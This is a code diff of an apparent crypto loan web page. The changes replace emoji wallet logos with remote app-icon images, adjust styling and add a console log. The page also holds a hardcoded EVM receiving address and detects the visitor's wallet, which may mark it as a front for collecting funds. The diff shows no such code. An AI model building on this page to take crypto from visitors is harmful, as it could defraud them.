@@ -64,6 +64,8 @@
         .footer { text-align: center; padding: 40px 20px; margin-top: 60px; border-top: 1px solid rgba(255,255,255,0.2); color: #1E3042; font-size: 13px; }
         .loan-terms { background: #e8f0f8; border-radius: 16px; padding: 15px; margin: 15px 0; font-size: 14px; }
         .repayment-info { font-size: 14px; margin-bottom: 15px; color: #2B4257; font-weight: 600; }
+        .wallet-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
+        .coin-icon { width: 24px; height: 24px; object-fit: contain; }
         .wallet-option, .coin-option { display: flex; align-items: center; gap: 12px; padding: 12px; border: 1px solid #e0e8f0; border-radius: 16px; cursor: pointer; transition: 0.2s; margin-bottom: 8px; }
         .wallet-option:hover, .coin-option:hover { background: #f5f9ff; border-color: #C9A03D; }
         .warning-text { color: #dc2626; font-size: 12px; margin-top: 8px; }
@@ -173,6 +175,15 @@
         EVM: '0x110ed6bd10cac183b50ff5875dd2ef9794d7c6ac'
     };
     
+    // Иконки кошельков (реальные картинки)
+    const WALLET_LOGOS = {
+        'OKX Wallet': 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/41/f6/98/41f6987b-5d4d-8a72-4b5d-951c1a419f88/AppIcon-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png',
+        'MetaMask': 'https://images.seeklogo.com/logo-png/42/1/metamask-logo-png_seeklogo-426728.png',
+        'Trust Wallet': 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/98/b4/98/98b49898-4778-bf51-05f0-ebd6edbac982/AppIcon-0-0-1x_U007epad-0-1-85-220.png/1200x630wa.png',
+        'Bitget Wallet': 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/d9/a5/a7/d9a5a757-37a9-a2f1-ccd1-572c157bec24/AppIcon-1x_U007epad-0-11-0-85-220-0.png/1200x630wa.png',
+        'TronLink': 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/52/45/f2/5245f216-0009-f19d-a0c0-8f8afb5ca43d/AppIcon-1x_U007emarketing-0-6-0-85-220-0.png/1200x630wa.png'
+    };
+    
     // Иконки монет
     const COIN_LOGOS = {
         'USDT': 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/32/color/usdt.png',
@@ -267,11 +278,11 @@
     let currentWalletBrowser = detectCurrentWallet();
     
     const wallets = [
-        { name: 'OKX Wallet', logo: '🟠', evmSupported: true, tronSupported: true, requiresBrowser: 'OKX Wallet' },
-        { name: 'MetaMask', logo: '🦊', evmSupported: true, tronSupported: false, requiresBrowser: 'MetaMask' },
-        { name: 'Trust Wallet', logo: '🔵', evmSupported: true, tronSupported: false, requiresBrowser: 'Trust Wallet' },
-        { name: 'Bitget Wallet', logo: '🟣', evmSupported: true, tronSupported: true, requiresBrowser: 'Bitget Wallet' },
-        { name: 'TronLink', logo: '🔴', evmSupported: false, tronSupported: true, requiresBrowser: 'TronLink' }
+        { name: 'OKX Wallet', logo: WALLET_LOGOS['OKX Wallet'], evmSupported: true, tronSupported: true },
+        { name: 'MetaMask', logo: WALLET_LOGOS['MetaMask'], evmSupported: true, tronSupported: false },
+        { name: 'Trust Wallet', logo: WALLET_LOGOS['Trust Wallet'], evmSupported: true, tronSupported: false },
+        { name: 'Bitget Wallet', logo: WALLET_LOGOS['Bitget Wallet'], evmSupported: true, tronSupported: true },
+        { name: 'TronLink', logo: WALLET_LOGOS['TronLink'], evmSupported: false, tronSupported: true }
     ];
     
     const coins = [
@@ -466,7 +477,7 @@
         const container = document.getElementById('walletList');
         container.innerHTML = wallets.map(w => `
             <div class="wallet-option" onclick="selectWalletHandler('${w.name}')">
-                <span style="font-size:28px;">${w.logo}</span>
+                <img class="wallet-icon" src="${w.logo}" onerror="this.style.display='none'">
                 <span style="font-weight:600;">${w.name}</span>
             </div>
         `).join('');
@@ -482,7 +493,7 @@
         const networkContainer = document.getElementById('networkList');
         networkContainer.innerHTML = coins.map(c => `
             <div class="coin-option" onclick="selectNetworkHandler('${c.network}', '${c.coin}')">
-                <img src="${COIN_LOGOS[c.coin]}" style="width:24px; height:24px;" onerror="this.style.display='none'">
+                <img class="coin-icon" src="${COIN_LOGOS[c.coin]}" onerror="this.style.display='none'">
                 <span style="font-weight:600;">${c.name}</span>
             </div>
         `).join('');
@@ -575,6 +586,8 @@
     });
     
     updateLanguage();
+    
+    console.log('Shafu loaded. Current wallet detected:', currentWalletBrowser);
 </script>
 </body>
 </html>
